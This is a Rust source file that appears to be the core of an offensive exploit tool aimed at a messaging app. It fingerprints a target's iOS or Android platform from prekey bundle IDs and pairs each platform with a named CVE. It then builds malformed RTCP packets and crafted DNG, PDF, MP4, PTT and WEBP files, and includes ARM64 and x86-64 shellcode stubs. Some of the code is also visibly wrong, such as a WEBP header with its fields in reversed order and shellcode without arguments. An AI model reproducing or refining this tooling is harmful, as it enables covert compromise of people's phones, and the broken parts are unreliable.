// core.rs - Shared core logic for graphite_core

#[derive(Debug, Clone)]
pub struct PrekeyBundle {
    pub signed_pk_id: u32,
    pub otpk_ids: Vec<u32>,
    pub platform_hint: i32,
    pub ios_version: i32,
}

#[derive(Debug, Clone)]
pub struct FingerprintResult {
    pub platform: i32,
    pub confidence: i32,
    pub exploit_cve: String,
}

pub fn fingerprint(bundle: &PrekeyBundle) -> FingerprintResult {
    let spk = bundle.signed_pk_id;
    let mut result = FingerprintResult {
        platform: 0,
        confidence: 0,
        exploit_cve: String::from("CVE-2019-3568"),
    };

    if spk >= 0x800000 && spk <= 0x9FFFFF {
        result.platform = 2;
        result.confidence = 90;
    } else if spk >= 0x100000 && spk <= 0xFFFFFF {
        result.platform = 1;
        result.confidence = 90;
    } else if !bundle.otpk_ids.is_empty() {
        if bundle.otpk_ids[0] > 0x1000000 {
            result.platform = 2;
            result.confidence = 85;
        } else {
            result.platform = 1;
            result.confidence = 85;
        }
    } else if bundle.platform_hint == 2 {
        result.platform = 2;
        result.confidence = 50;
    } else if bundle.platform_hint == 1 {
        result.platform = 1;
        result.confidence = 50;
    }

    if result.platform == 2 && bundle.ios_version >= 17 {
        result.exploit_cve = String::from("CVE-2025-55177");
    }

    result
}

pub fn platform_name(platform: i32) -> &'static str {
    match platform {
        1 => "Android",
        2 => "iOS",
        _ => "Unknown",
    }
}

pub fn craft_rtcp(ssrc: u32) -> Vec<u8> {
    let mut buf = Vec::with_capacity(2048);
    buf.push(0x9F);
    buf.push(201);
    buf.push(0x00);
    buf.push(0x08 + 31 * 6);
    buf.extend_from_slice(&ssrc.to_be_bytes());
    for _ in 0..31 {
        buf.extend_from_slice(&[0x41; 24]);
    }
    buf.push(0x81);
    buf.push(202);
    buf.push(0x01);
    buf.push(0x05);
    buf.extend_from_slice(&ssrc.to_be_bytes());
    buf.push(1);
    buf.push(255);
    buf.extend_from_slice(&[0x42; 255]);
    buf.push(0x81);
    buf.push(203);
    buf.push(0x01);
    buf.push(0x05);
    buf.extend_from_slice(&ssrc.to_be_bytes());
    buf.push(255);
    buf.extend_from_slice(&[0x43; 255]);
    buf
}

pub fn craft_dng() -> Vec<u8> {
    let mut buf = Vec::with_capacity(1024);
    buf.extend_from_slice(b"II");
    buf.extend_from_slice(&[42, 0]);
    buf.extend_from_slice(&[8, 0, 0, 0]);
    buf.extend_from_slice(&[0xFF, 0xC3, 0x00, 0x0B, 0x08, 0x00, 0x10, 0x00, 0x10, 0x03, 0x01, 0x11]);
    buf.extend_from_slice(&[0xFF, 0xDA, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00]);
    while buf.len() < 1014 {
        buf.push(0x00);
    }
    buf.extend_from_slice(&[0xFF, 0xD9]);
    buf
}

pub fn craft_pdf() -> Vec<u8> {
    let mut buf = Vec::with_capacity(8192);
    buf.extend_from_slice(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n");
    buf.extend_from_slice(b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n");
    buf.extend_from_slice(b"2 0 obj\n<< /Length 4096 >>\nstream\n");
    buf.extend_from_slice(&[0x41; 4096]);
    buf.extend_from_slice(b"\nendstream\nendobj\n");
    buf.extend_from_slice(b"trailer\n<< /Size 3 /Root 1 0 R >>\nstartxref\n100\n%%EOF\n");
    buf
}

pub fn craft_mp4() -> Vec<u8> {
    let mut buf = Vec::with_capacity(1024);
    let ftyp_size: u32 = 20;
    buf.extend_from_slice(&ftyp_size.to_be_bytes());
    buf.extend_from_slice(b"ftyp");
    buf.extend_from_slice(b"isom");
    buf.extend_from_slice(&[0, 0, 0, 0]);
    buf.extend_from_slice(b"isomiso2mp41");
    let moov_size: u32 = 516;
    buf.extend_from_slice(&moov_size.to_be_bytes());
    buf.extend_from_slice(b"moov");
    buf.extend_from_slice(&[0x42; 508]);
    buf
}

pub fn craft_ptt() -> Vec<u8> {
    let mut buf = Vec::with_capacity(1024);
    buf.extend_from_slice(b"PTT\0");
    while buf.len() < 1024 {
        buf.push(0x43);
    }
    buf
}

pub fn craft_webp() -> Vec<u8> {
    let mut buf = Vec::with_capacity(1024);
    buf.extend_from_slice(b"WEBP");
    buf.extend_from_slice(b"RIFF");
    while buf.len() < 1024 {
        buf.push(0x44);
    }
    buf
}

pub fn shellcode_arm64() -> Vec<u8> {
    vec![
        0x00, 0x00, 0x80, 0xd2,
        0x21, 0x00, 0x80, 0xd2,
        0x42, 0x00, 0x80, 0xd2,
        0x08, 0x00, 0x80, 0xd2,
        0x01, 0x00, 0x00, 0xd4,
    ]
}

pub fn shellcode_x86_64() -> Vec<u8> {
    vec![
        0x48, 0x31, 0xc0,
        0x48, 0x31, 0xff,
        0x48, 0x31, 0xf6,
        0x48, 0x31, 0xd2,
        0xb0, 0x3b,
        0x0f, 0x05,
    ]
}
